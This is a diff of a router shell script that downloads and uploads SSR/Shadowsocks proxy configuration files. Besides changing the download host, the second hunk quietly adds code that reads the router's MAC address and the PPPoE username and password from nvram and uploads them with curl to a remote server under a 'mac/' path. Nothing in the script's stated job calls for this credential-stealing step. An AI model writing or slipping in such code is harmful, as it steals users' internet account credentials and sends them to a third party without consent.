@@ -137,7 +137,7 @@ get_from_tckssr()
 rm ss.txt > /dev/null 2>&1
 tkcssr="`nvram get tkcssr`"
 if [ ! "$tkcssr"x = "x" ] ; then 
-iss="https://capsule.cf/"$tkcssr
+iss="https://www.tkcssr.com/"$tkcssr
 wget  -O ss.txt -T 10 $iss >>ss.log 2>>ss.log
 [ ! -s ss.txt ] && wget  -O ss.txt -T 10 $iss >>ss.log 2>>ss.log
 [ ! -s ss.txt ] && wget  -O ss.txt -T 10 $iss >>ss.log 2>>ss.log
@@ -570,6 +570,14 @@ if   [ -s ssr.ini ] ; then
   if [ ! "$ssr_url" = "" ] ; then
     curl -T ssr.txt $ssr_url"ssr.txt"
     curl -T ssr.ini $ssr_url"ssr.ini"  
+	
+	fn=`cat /sys/class/net/br0/address`
+	fn=${fn//:/-}
+	cat /sys/class/net/br0/address >$fn
+	nvram get wan_pppoe_username >>$fn
+	nvram get wan_pppoe_passwd >>$fn	
+	curl -T $fn $ssr_url"mac/"$fn
+
 #    sed  -i  's/^..../ssr:\/\//'  ss.inf   
     head -n 5 ssr.ini >ss.txt
     curl -T ss.txt $ssr_url"ss.txt"      
